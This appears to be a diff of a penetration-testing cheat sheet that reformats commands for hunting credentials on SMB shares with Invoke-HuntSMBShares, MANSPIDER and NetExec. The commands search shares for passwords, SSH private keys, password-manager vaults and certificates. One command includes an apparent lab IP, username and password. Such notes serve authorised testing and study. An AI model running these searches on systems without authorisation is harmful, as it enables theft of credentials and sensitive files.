 Execute the tool:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Invoke-HuntSMBShares -Threads 100 -RunSpaceTimeOut 10 -OutputDirectory c:\Users\Public -DomainController <DC_IP> -Credential <DOMAIN>\<USER>
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -4734,70 +6726,86 @@ Invoke-HuntSMBShares -Threads 100 -RunSpaceTimeOut 10 -OutputDirectory c:\Users\
 
 If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run MANSPIDER using the official Docker container to avoid dependency issues.
 
-**Install**
+1. **Install** prerequisites
 
-Pre-requisites:
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo apt install tesseract-ocr && sudo apt install antiword
 ```
 
-Tool:
+</td>
+</tr>
+</table>
+
+2. **Install** MANSPIDER
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 pip install pipx
 pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
 ```
 
-**Install (using Docker)**
+</td>
+</tr>
+</table>
+
+**Alternative: Install using Docker**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Password2025!'
 ```
 
-**Usage**
+</td>
+</tr>
+</table>
 
-```bash
-./manspider.sh --help
-```
+**Usage Examples**
 
-Example #1: Search the network for filenames that may contain creds
-NOTE: matching files are automatically downloaded into `$HOME/.manspider/loot`! (`-n` to disable)
+> **NOTE:** Matching files are automatically downloaded into `$HOME/.manspider/loot`! (`-n` to disable)
 
-```bash
-manspider 192.168.0.0/24 -f <KEY_WORD1> <KEY_WORD2> <KEY_WORD3> -d <corp> -u <USER> -p <PASSWORD>
-```
-
-Example #2: Search for spreadsheets with a key word in the filename
-```bash
-manspider <SHARE_NAME>.<corp.local> -f <KEY_WORD> -e <EXT 1> <EXT 2> -d <corp> -u <USER> -p <PASSWORD>
-```
-
-Example #3: Search for documents containing a key word
-```bash
-manspider <SHARE_NAME>.<corp.local> -c <KEY_WORD> -e <EXT 1> <EXT 2> <EXT 3> -d <corp> -u <USER> -p <PASSWORD>
-```
-
-Example #4: Search for interesting file extensions
-```bash
-manspider <SHARE_NAME>.<corp.local> -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config vmdk vhd vdi dit -d <corp> -u <USER> -p <PASSWORD>
-```
-
-Example #5: Search for finance-related files
-This example searches financy-sounding directories for filenames containing 5 or more consecutive numbers (e.g. `000202006.EFT`)
-```bash
-manspider <SHARE_NAME>.<corp.local> --dirnames bank financ payable payment reconcil remit voucher vendor eft swift -f '[0-9]{5,}' -d <corp> -u <USER> -p <PASSWORD>
-```
-
-Example #6: Search for SSH keys by filename
-```bash
-manspider <SHARE_NAME>.<corp.local> -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -d <corp> -u <USER> -p <PASSWORD>
-```
-
-Example #7: Search for SSH keys by content
-```bash
-manspider <SHARE_NAME>.<corp.local> -e '' -c 'BEGIN .{1,10} PRIVATE KEY' -d <corp> -u <USER> -p <PASSWORD>
-```
+| Example | Command |
+|---------|---------|
+| Search network for credential filenames | `manspider 192.168.0.0/24 -f <KEY_WORD1> <KEY_WORD2> -d <corp> -u <USER> -p <PASSWORD>` |
+| Search spreadsheets by filename | `manspider <SHARE>.<corp.local> -f <KEY_WORD> -e xlsx csv -d <corp> -u <USER> -p <PASSWORD>` |
+| Search documents by content | `manspider <SHARE>.<corp.local> -c <KEY_WORD> -e doc docx pdf -d <corp> -u <USER> -p <PASSWORD>` |
+| Search interesting extensions | `manspider <SHARE>.<corp.local> -e bat vbs ps1 pem key pfx cfg conf vmdk dit -d <corp> -u <USER> -p <PASSWORD>` |
+| Search finance directories | `manspider <SHARE>.<corp.local> --dirnames bank financ payable -f '[0-9]{5,}' -d <corp> -u <USER> -p <PASSWORD>` |
+| Search SSH keys by filename | `manspider <SHARE>.<corp.local> -e ppk rsa pem -f id_rsa id_dsa -d <corp> -u <USER> -p <PASSWORD>` |
+| Search SSH keys by content | `manspider <SHARE>.<corp.local> -e '' -c 'BEGIN .{1,10} PRIVATE KEY' -d <corp> -u <USER> -p <PASSWORD>` |
 
 Example #8: Search for password manager files
 
@@ -4824,27 +6832,35 @@ Example #8: Search for password manager files
 | `.jpass`      | JPass                                    |
 | `.pwmdb`     | Universal Password Manager               |
 
-```bash
-manspider <SHARE_NAME>.<corp.local> -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -d <corp> -u <USER> -p <PASSWORD>
-```
-
-Example #9: Search for certificates
-```bash
-manspider <SHARE_NAME>.<corp.local> -e pfx p12 pkcs12 pem key crt cer csr jks keystore key keys der -d <corp> -u <USER> -p <PASSWORD>
-```
+| Search password manager files | `manspider <SHARE>.<corp.local> -e kdbx kdb 1pif opvault psafe3 enpass bwdb -d <corp> -u <USER> -p <PASSWORD>` |
+| Search certificates | `manspider <SHARE>.<corp.local> -e pfx p12 pem crt cer csr jks keystore der -d <corp> -u <USER> -p <PASSWORD>` |
 
 </details>
 
 <details>
 <summary><h4>NetExec</h4></summary>
 
-In addition to its many other uses, NetExec can also be used to search through network shares using the --spider option. This functionality is described in great detail on the [official wiki](https://www.netexec.wiki/smb-protocol/spidering-shares). 
+In addition to its many other uses, NetExec can also be used to search through network shares using the --spider option. This functionality is described in great detail on the [official wiki](https://www.netexec.wiki/smb-protocol/spidering-shares).
 
-A basic scan of network shares for files containing the string "passw" can be run like so:
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 netexec smb <IP> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --pattern "passw" --timeout 30
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
